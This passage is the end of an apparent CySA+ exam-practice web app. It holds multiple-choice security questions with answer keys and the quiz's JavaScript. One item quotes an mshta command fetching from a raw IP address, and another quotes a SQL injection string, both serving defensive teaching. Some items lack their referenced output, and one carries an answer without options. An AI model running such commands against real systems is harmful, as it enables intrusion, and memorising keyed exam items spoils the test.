following is a reason why a SOC team member might spend extra time on a routine incident prior to closing it?", "options": [{"letter": "A", "text": "To allow another team member to manage more tickets"}, {"letter": "B", "text": "To increase the mean time to respond metric"}, {"letter": "C", "text": "To write a report classifying the incident within the MITRE ATT&CK framework"}, {"letter": "D", "text": "To create an automated process for handling it the next time"}], "answer": "D"}, {"id": 545, "question": "An analyst receives the following summary report for vulnerabilities on multiple hosts:\nWhich of the following servers should the analyst remediate first?", "options": [{"letter": "A", "text": "COMPTIA-WEB01"}, {"letter": "B", "text": "COMPTIA-APP01"}, {"letter": "C", "text": "COMPTIA-FS01"}, {"letter": "D", "text": "COMPTIA-DC01"}], "answer": "B"}, {"id": 546, "question": "An incident response team identifies a malicious uniform resource locator (URL) associated with a required business process and performs the\nfollowing activities:\n• Access to the URL has been restricted only to the necessary users through firewall rules and Cloud Security Group rules.\n• Additional monitoring has been enabled for traffic related to that site and the allowed users.\n• All application servers that need to access that site have been patched with the latest security and software updates.\n• Application owners have been notified of the severity and need to remediate this reported issue.\nWhich of the following best describes the overall mitigation the security team is performing?", "options": [{"letter": "A", "text": "Patching solutions"}, {"letter": "B", "text": "Configuration management"}, {"letter": "C", "text": "Compensating controls"}, {"letter": "D", "text": "Attack surface management"}], "answer": "C"}, {"id": 547, "question": "A compliance analyst works with a management team to develop remediation plans following a recent red-team assessment of the organization's\noperational technology (OT) networks within an industrial facility. While the backbone of the OT network is based on modern, fully supported\ninfrastructure, the OT components are outdated and vulnerable to a variety of attacks. Further mitigation is not possible from a logical controls\nperspective. Which of the following approaches is best for the organization to consider for ongoing risk mitigation efforts?", "options": [{"letter": "A", "text": "Reduced patching requirements for ОТ systems"}, {"letter": "B", "text": "Deployment of token-based multifactor authentication (MFA) for all access to industrial systems"}, {"letter": "C", "text": "Increased use of network segmentation"}, {"letter": "D", "text": "Expansion of cyber insurance coverage"}, {"letter": "E", "text": "Enhanced usage of AI to augment existing endpoint detection and response (EDR) solutions"}], "answer": "C"}, {"id": 548, "question": "Before merging with a software company, the acquiring company's legal team requires a detailed software scan to determine if all code base is\nusing open-source or paid licensed libraries. The vulnerability management analyst needs to provide this report. Which of the following scan\nmethods will best meet this requirement?", "options": [{"letter": "A", "text": "Static application security testing (SAST)"}, {"letter": "B", "text": "Dynamic application security testing (DAST)"}, {"letter": "C", "text": "Software composition analysis (SCA)"}, {"letter": "D", "text": "Runtime application self-protection (RASP)"}, {"letter": "E", "text": "Credentialed vulnerability scan"}], "answer": "C"}, {"id": 549, "question": "HOTSPOT\n-\nAn organization receives an indication that one of its hosts is part of a DDoS attack against a victim. The proxy server is supposed to handle all\nweb page requests from all internal hosts.\nINSTRUCTIONS\n-\nClick on each workstation and server to review outputs and a log file.\nIdentify the compromised host and executable, and determine an appropriate remediation for the issue.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.", "options": [{"letter": "", "text": "No answer choices parsed. Use the PDF for this PBQ/image-based item."}], "answer": "C"}, {"id": 550, "question": "An analyst is researching potential indicators of compromise (IoCs) on a server and receives the following output:\nWhich of following best describes the potential IoC?", "options": [{"letter": "A", "text": "Enumeration"}, {"letter": "B", "text": "Rogue device"}, {"letter": "C", "text": "Activity on unexpected ports"}, {"letter": "D", "text": "Unauthorized software"}], "answer": "C"}, {"id": 551, "question": "As part of a malware analysis, a security analyst finds the following:\nmshta https://185.43.143.6/dXNlcjliYWxkbzY4NClwd2Q9RkBuY3lLYXQxLUlQPTIzLjcuNDIuMSlwPTIyODA=\nWhich of the following is the best tool to use for additional analysis?", "options": [{"letter": "A", "text": "Metasploit"}, {"letter": "B", "text": "strings"}, {"letter": "C", "text": "VirusTotal"}, {"letter": "D", "text": "CyberChef"}, {"letter": "E", "text": "Wireshark"}], "answer": "D"}, {"id": 552, "question": "An incident response team investigates a possible data leak. Various IT systems collect evidence. Which of the following processes is required to\nensure that evidentiary artifacts are properly recorded?", "options": [{"letter": "A", "text": "Packaging and labeling"}, {"letter": "B", "text": "Chain of custody"}, {"letter": "C", "text": "Post incident reporting"}, {"letter": "D", "text": "Storage and containment"}], "answer": "B"}, {"id": 553, "question": "A red-team exercise identifies the following string that was entered in a username field on a web application and caused data exposure:\n‘ or 1=1; select * from users; --\nWhich of the following is the best strategy to remediate this issue?", "options": [{"letter": "A", "text": "Attack surface management"}, {"letter": "B", "text": "Secure coding best practices"}, {"letter": "C", "text": "Compensating controls"}, {"letter": "D", "text": "Patching and configuration management"}], "answer": "B"}, {"id": 554, "question": "Several devices are added to a business network. Some of the new devices do not generate traffic during business hours. Which of the following\nscanning methods is the best way to identify the risk?", "options": [{"letter": "A", "text": "Passive"}, {"letter": "B", "text": "Active"}, {"letter": "C", "text": "Mapping"}, {"letter": "D", "text": "Agentless"}], "answer": "B"}, {"id": 555, "question": "Current playbooks for incident response mention resources that have been decommissioned. Which of the following actions should an analyst\ntake?", "options": [{"letter": "A", "text": "Schedule a meeting with the responsible team for a policy review"}, {"letter": "B", "text": "Create an automation script to archive unused playbooks."}, {"letter": "C", "text": "Begin an asset inventory review with the appropriate team."}, {"letter": "D", "text": "Rewrite all threat response playbooks."}], "answer": "A"}, {"id": 556, "question": "A Chief Information Security Officer wants to map all of the attack vectors that the company faces each day. Which of the following\nrecommendations should the company align its security controls around?", "options": [{"letter": "A", "text": "OSSTMM"}, {"letter": "B", "text": "Diamond Model of Intrusion Analysis"}, {"letter": "C", "text": "ОWASP"}, {"letter": "D", "text": "MITRE ATT&CK"}], "answer": "D"}, {"id": 557, "question": "Which of the following best describes the action a technical team should take during the containment phase of a security breach?", "options": [{"letter": "A", "text": "Make vulnerability scan reports available to the appropriate teams."}, {"letter": "B", "text": "Create automation scripts for immediate isolation."}, {"letter": "C", "text": "Maintain a reliable patch management solution."}, {"letter": "D", "text": "Specify clear and defined incident response roles."}], "answer": "B"}, {"id": 558, "question": "Based on recent alerts, a security analyst thinks a web application server was compromised. The analyst reviews the following server output:\nWhich of the following best describes what has occurred?", "options": [{"letter": "A", "text": "An initiated unauthorized session"}, {"letter": "B", "text": "Too many users logged in at the same time"}, {"letter": "C", "text": "High resource consumption"}, {"letter": "D", "text": "Abnormal idle times for each user"}], "answer": "A"}, {"id": 559, "question": "An incident response manager conducts a tabletop exercise. Which of the following steps should the incident response manager take next?", "options": [{"letter": "A", "text": "Containment"}, {"letter": "B", "text": "Response"}, {"letter": "C", "text": "Lessons learned"}, {"letter": "D", "text": "Root cause analysis"}], "answer": "C"}, {"id": 560, "question": "Which of the following is the best reason to heavily segment business-critical assets from within the network?", "options": [{"letter": "A", "text": "Legacy systems"}, {"letter": "B", "text": "Degraded functionality"}, {"letter": "C", "text": "Asset obfuscation"}, {"letter": "D", "text": "Proprietary server"}], "answer": "A"}, {"id": 561, "question": "A security director at a remote company is concerned about recent threat intelligence reports regarding threat actors who are hired by the\ncompany and steal intellectual property. Which of the following solutions are the best ways to identify the tactics, techniques, and procedures\n(TTPs) used by these threat actors? (Choose two.)", "options": [{"letter": "A", "text": "Installing and configuring a data loss prevention tool"}, {"letter": "B", "text": "Subscribing to an identity proofing service for all employees"}, {"letter": "C", "text": "Conducting thorough background checks on all incoming employees"}, {"letter": "D", "text": "Utilizing user behavioral analytics-based detections implemented in the security information and event management (SIEM)"}, {"letter": "E", "text": "Deploying a fully featured endpoint detection and response (EDR)"}, {"letter": "F", "text": "Validating identification information manually"}], "answer": "DE"}, {"id": 562, "question": "Which of the following is the main concept behind the use of an attack methodology framework?", "options": [{"letter": "A", "text": "Implementing continuous monitoring and rapid deployment of system fixes over the traditional patch, test, and deploy approach"}, {"letter": "B", "text": "Prioritizing vulnerabilities that can be exploited based on risk calculations and using the consequences and likelihood of the exploits to\ndetermine where resources should be allocated"}, {"letter": "C", "text": "Approaching cybersecurity from the perspective of a threat actor and using their common behaviors and motivations to identify secure\nsolutions"}, {"letter": "D", "text": "Applying a Zero Trust environment by assuming networks and systems are vulnerable to malicious actions by both external, hostile\nadversaries and insider threats"}], "answer": "C"}, {"id": 563, "question": "A security analyst reviews the public-facing attack surface of a network that contains both Windows and Linux servers. Which of the following\ncommands is the best way to identify the services running?", "options": [{"letter": "A", "text": "nmap -O -p- -iL hosts.txt"}, {"letter": "B", "text": "nmap -sV -pl-1024 -iL hosts.txt"}, {"letter": "C", "text": "nmap -sP -A -iL hosts.txt"}, {"letter": "D", "text": "nmap -sn -vvvv -iL hosts.txt"}], "answer": "B"}, {"id": 564, "question": "Which of the following can a software provider use to implement secure authentication and authorization mechanisms that leverage existing\ncontrols in-place on their customers' environments?", "options": [{"letter": "A", "text": "SSO"}, {"letter": "B", "text": "SASE"}, {"letter": "C", "text": "PAM"}, {"letter": "D", "text": "CASB"}], "answer": "A"}, {"id": 565, "question": "As part of a quality assurance test, a developer wants to examine how the code behaves after an application has been fully compiled and is\nrunning. Which of the following best describes the type of testing that the developer should perform?", "options": [{"letter": "A", "text": "Black box"}, {"letter": "B", "text": "Static"}, {"letter": "C", "text": "Dynamic"}, {"letter": "D", "text": "Diagnostic"}], "answer": "C"}, {"id": 566, "question": "A security analyst is scanning an ICS host (192.168.1.5) in an industrial plant for insecure ports while minimizing the impact to uptime or\nperformance. Which of following commands should the analyst use to perform the task?", "options": [{"letter": "A", "text": "nmap 192.168.1.5 -Т1 -P 21"}, {"letter": "B", "text": "nmap 192.168.1.5 -T2 -P 3389"}, {"letter": "C", "text": "nmap 192.168.1.5 -T3 -P 22"}, {"letter": "D", "text": "nmap 192.168.1.5 -T5 -P 80"}], "answer": "A"}, {"id": 567, "question": "A security analyst discovers several vulnerabilities on a critical legacy system. The analyst must recommend a solution with the following\nlimitations:\n• No downtime is permitted due to criticality.\n• Patches for the vulnerabilities do not exist.\n• No redundancy systems are in place.\nWhich of the following is the best risk management strategy to implement?", "options": [{"letter": "A", "text": "Transference"}, {"letter": "B", "text": "Mitigation"}, {"letter": "C", "text": "Avoidance"}, {"letter": "D", "text": "Acceptance"}], "answer": "B"}, {"id": 568, "question": "Which of the following best describes the reason a root cause analysis is an important part of the incident response process?", "options": [{"letter": "A", "text": "Compliance teams can be legally required to conduct a post-incident root cause analysis to satisfy regulatory requirements."}, {"letter": "B", "text": "Response teams can use the analysis to isolate a system while the incident is ongoing to prevent further contamination."}, {"letter": "C", "text": "The organization can use the results of the analysis to provide stakeholders with assurances that customer data was not disclosed."}, {"letter": "D", "text": "The leadership team can better allocate resources to address systemic issues that span multiple groups in an organization."}], "answer": "D"}, {"id": 569, "question": "Which of the following will most likely help decrease false positives?", "options": [{"letter": "A", "text": "Automating escalation"}, {"letter": "B", "text": "A security operations center (SOC) dashboard"}, {"letter": "C", "text": "Threat hunting"}, {"letter": "D", "text": "Alert tuning"}], "answer": "D"}, {"id": 570, "question": "A security analyst reviews the following finding and reports it to the development team:\nThe development team concludes that this finding is a false positive. Which of the following is the next best course of action?", "options": [{"letter": "A", "text": "Tune the scan fingerprinting settings."}, {"letter": "B", "text": "Manually verify the finding."}, {"letter": "C", "text": "Close the finding as false-positive."}, {"letter": "D", "text": "Upgrade the Apache Hypertext Transfer Protocol (HTTP) server to the latest version."}, {"letter": "E", "text": "Run a credentialed scan."}], "answer": "B"}, {"id": 571, "question": "Which of the following is a reason the false-positive rate is an important metric for incident response reporting and communication?", "options": [{"letter": "A", "text": "A high false-positive rate indicates that the alerting rules are not sensitive enough."}, {"letter": "B", "text": "A high false-positive rate can help the response team prioritize critical events."}, {"letter": "C", "text": "A high false-positive rate validates that the incident response plan is working well."}, {"letter": "D", "text": "A high false-positive rate can result in wasted time and resources."}], "answer": "D"}];
let i=0, mode='all', filtered=[...QUESTIONS.keys()];const KEY='cysa003_pwa_v1';let progress=JSON.parse(localStorage.getItem(KEY)||'{}');function save(){localStorage.setItem(KEY,JSON.stringify(progress));stats()}function p(id){return progress[id]||(progress[id]={seen:false,correct:false,picked:[],saved:false})}function ansLetters(q){return q.answer.split('')}function render(){if(!filtered.length){document.getElementById('card').innerHTML='<div class="qbody">No questions match this filter.</div>';return}i=Math.max(0,Math.min(i,filtered.length-1));const q=QUESTIONS[filtered[i]], pr=p(q.id);let opts=q.options.map(o=>{let cls='opt'; if(pr.picked.includes(o.letter)) cls+=' selected'; if(pr.picked.length){if(ansLetters(q).includes(o.letter)) cls+=' correct'; else if(pr.picked.includes(o.letter)) cls+=' wrong'}return `<button class="${cls}" onclick="pick('${o.letter}')"><span class="letter">${o.letter}.</span> ${escapeHtml(o.text)}</button>`}).join('');let good=pr.picked.length&&pr.correct;let bad=pr.picked.length&&!pr.correct;document.getElementById('card').innerHTML=`<div class="qtop"><span>Question #${q.id}</span><span>${i+1}/${filtered.length}</span></div><div class="qbody"><div class="q">${escapeHtml(q.question)}</div><div class="opts">${opts}</div><div class="status ${good?'good':bad?'bad':''}">${good?'Correct ✅':bad?'Not quite ❌':''}</div><div class="answer ${pr.picked.length?'show':''}"><b>Answer:</b> ${q.answer}</div><div class="row"><button class="btn" onclick="toggleSave()">${pr.saved?'★ Bookmarked':'☆ Bookmark'}</button><button class="btn" onclick="clearOne()">Clear</button></div></div>`;document.getElementById('count').textContent=`Question ${i+1} of ${filtered.length} • ${QUESTIONS.length} total`;stats()}function pick(l){const q=QUESTIONS[filtered[i]], pr=p(q.id), need=ansLetters(q); if(need.length>1){pr.picked=pr.picked.includes(l)?pr.picked.filter(x=>x!==l):[...pr.picked,l];}else{pr.picked=[l]}pr.seen=true;pr.correct=need.every(x=>pr.picked.includes(x))&&pr.picked.length===need.length;save();render()}function nextQ(){i++; if(i>=filtered.length)i=0; render();scrollTo(0,0)}function prevQ(){i--; if(i<0)i=filtered.length-1; render();scrollTo(0,0)}function randomQ(){i=Math.floor(Math.random()*filtered.length);render();scrollTo(0,0)}function nextUnanswered(){let idx=filtered.findIndex(k=>!p(QUESTIONS[k].id).seen); if(idx<0)idx=0;i=idx;render();scrollTo(0,0)}function toggleSave(){const q=QUESTIONS[filtered[i]];p(q.id).saved=!p(q.id).saved;save();render()}function clearOne(){const q=QUESTIONS[filtered[i]];delete progress[q.id];save();render()}function resetProgress(){if(confirm('Reset all CySA+ progress?')){progress={};save();render()}}function setMode(m){mode=m;for(const x of ['All','Missed','Saved'])document.getElementById('m'+x).classList.toggle('on',m===x.toLowerCase());doSearch()}function doSearch(){const s=document.getElementById('search').value.toLowerCase().trim();filtered=QUESTIONS.map((q,k)=>[q,k]).filter(([q])=>{let pr=p(q.id); if(mode==='missed'&&(!pr.seen||pr.correct))return false;if(mode==='saved'&&!pr.saved)return false;if(!s)return true;return (q.question+' '+q.options.map(o=>o.text).join(' ')+' '+q.answer).toLowerCase().includes(s)}).map(x=>x[1]);i=0;render()}function stats(){let vals=QUESTIONS.map(q=>p(q.id));let seen=vals.filter(x=>x.seen).length, cor=vals.filter(x=>x.correct).length;document.getElementById('seen').textContent=seen;document.getElementById('correct').textContent=cor;document.getElementById('acc').textContent=seen?Math.round(cor/seen*100)+'%':'0%';document.getElementById('fill').style.width=(seen/QUESTIONS.length*100)+'%'}function escapeHtml(s){return String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}if('serviceWorker' in navigator){navigator.serviceWorker.register('./sw.js')}render();</script></body></html>
